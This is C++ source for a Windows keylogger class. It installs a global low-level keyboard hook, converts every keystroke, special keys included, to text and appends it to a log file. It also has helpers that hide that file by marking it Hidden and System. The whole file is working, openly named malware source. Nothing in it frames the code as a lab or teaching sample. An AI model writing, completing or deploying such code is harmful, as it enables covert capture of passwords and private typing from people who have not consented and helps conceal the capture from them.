#include "KeyLogger.hpp"

// thread-local instance used by the hook in this thread
KeyLogger *KeyLogger::s_instance = nullptr;

/**
 * @brief Constructs a KeyLogger bound to a filename.
 * @param filename Path where keystrokes will be logged.
 */
KeyLogger::KeyLogger(const std::string &filename)
    : hook(nullptr), filePath(filename), running(false), threadId(0)
{
    s_instance = this;
}

/**
 * @brief Destructor ensures the keylogger is stopped.
 */
KeyLogger::~KeyLogger()
{
    stop();
}

/**
 * @brief Starts the keylogger: installs the low-level keyboard hook and enters a message loop.
 */
void KeyLogger::start()
{
    outFile.open(filePath, std::ios::app);
    if (!outFile.is_open())
        return;

    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, nullptr, 0);
    if (!hook)
        return;

    running = true;
    threadId = GetCurrentThreadId();

    MSG msg;
    while (running && GetMessage(&msg, nullptr, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (hook)
    {
        UnhookWindowsHookEx(hook);
        hook = nullptr;
    }
    outFile.close();
}

/**
 * @brief Stops the keylogger by signaling the loop to exit and posting WM_QUIT.
 */
void KeyLogger::stop()
{
    running = false;
    if (threadId != 0)
    {
        PostThreadMessage(threadId, WM_QUIT, 0, 0);
    }
}

/**
 * @brief Reads and returns the contents of the log file.
 * @return std::string Entire log content.
 */
std::string KeyLogger::getLoggedData()
{
    std::ifstream inFile(filePath);
    if (!inFile.is_open())
        return "";

    std::ostringstream oss;
    std::string line;
    while (std::getline(inFile, line))
    {
        oss << line << "\n";
    }
    return oss.str();
}

/**
 * @brief Clears the key log by truncating the file.
 */
void KeyLogger::clearLogFile()
{
    std::ofstream clearFile(filePath, std::ios::trunc);
}

/**
 * @brief Hide a file by setting its attributes to Hidden and System.
 * @param filename File path to hide.
 */
void KeyLogger::hideFile(const std::string &filename)
{
    SetFileAttributesA(filename.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}

/**
 * @brief Unhide a file by resetting its attributes to normal.
 * @param filename File path to unhide.
 */
void KeyLogger::unhideFile(const std::string &filename)
{
    SetFileAttributesA(filename.c_str(), FILE_ATTRIBUTE_NORMAL);
}

/**
 * @brief Static hook callback; forwards to the current instance.
 */
LRESULT CALLBACK KeyLogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN && s_instance)
    {
        KBDLLHOOKSTRUCT *kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
        DWORD vkCode = kbStruct->vkCode;

        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);
        s_instance->processKeyEvent(vkCode, keyboardState);
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

/**
 * @brief Handles a single key event, converts it to readable form, and writes to log.
 * @param vkCode Virtual key code of the key pressed.
 * @param keyboardState Current keyboard state for translation.
 */
void KeyLogger::processKeyEvent(DWORD vkCode, BYTE keyboardState[256])
{
    WCHAR buffer[5] = {0};
    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    HKL layout = GetKeyboardLayout(0);
    int result = ToUnicodeEx(vkCode, scanCode, keyboardState, buffer, 4, 0, layout);

    if (result > 0)
    {
        char utf8Char[5] = {0};
        int len = WideCharToMultiByte(CP_UTF8, 0, buffer, 1, utf8Char, sizeof(utf8Char), nullptr, nullptr);
        if (len > 0 && outFile.is_open())
        {
            outFile.write(utf8Char, len);
            outFile.flush();
        }
        return;
    }

    if (!outFile.is_open())
        return;

    static const std::unordered_map<DWORD, std::string> specialKeys = {
        {VK_RETURN, "[ENTER]"}, {VK_BACK, "[BACK]"}, {VK_SPACE, " "}, {VK_TAB, "[TAB]"},
        {VK_ESCAPE, "[ESC]"}, {VK_CAPITAL, "[CAPSLOCK]"}, {VK_SHIFT, "[SHIFT]"},
        {VK_LSHIFT, "[SHIFT]"}, {VK_RSHIFT, "[SHIFT]"}, {VK_CONTROL, "[CTRL]"},
        {VK_LCONTROL, "[CTRL]"}, {VK_RCONTROL, "[CTRL]"}, {VK_MENU, "[ALT]"},
        {VK_LMENU, "[ALT]"}, {VK_RMENU, "[ALT]"}, {VK_LWIN, "[WIN]"}, {VK_RWIN, "[WIN]"},
        {VK_LEFT, "[LEFT]"}, {VK_RIGHT, "[RIGHT]"}, {VK_UP, "[UP]"}, {VK_DOWN, "[DOWN]"},
        {VK_INSERT, "[INS]"}, {VK_DELETE, "[DEL]"}, {VK_HOME, "[HOME]"}, {VK_END, "[END]"},
        {VK_PRIOR, "[PAGEUP]"}, {VK_NEXT, "[PAGEDOWN]"}, {VK_NUMLOCK, "[NUMLOCK]"},
        {VK_SCROLL, "[SCROLLLOCK]"}, {VK_SNAPSHOT, "[PRTSC]"}, {VK_PAUSE, "[PAUSE]"},
        {VK_F1, "[F1]"}, {VK_F2, "[F2]"}, {VK_F3, "[F3]"}, {VK_F4, "[F4]"},
        {VK_F5, "[F5]"}, {VK_F6, "[F6]"}, {VK_F7, "[F7]"}, {VK_F8, "[F8]"},
        {VK_F9, "[F9]"}, {VK_F10, "[F10]"}, {VK_F11, "[F11]"}, {VK_F12, "[F12]"}
    };

    auto it = specialKeys.find(vkCode);
    if (it != specialKeys.end())
    {
        outFile << it->second;
    }
    else
    {
        outFile << "[UNK:" << vkCode << "]";
    }
    outFile.flush();
}
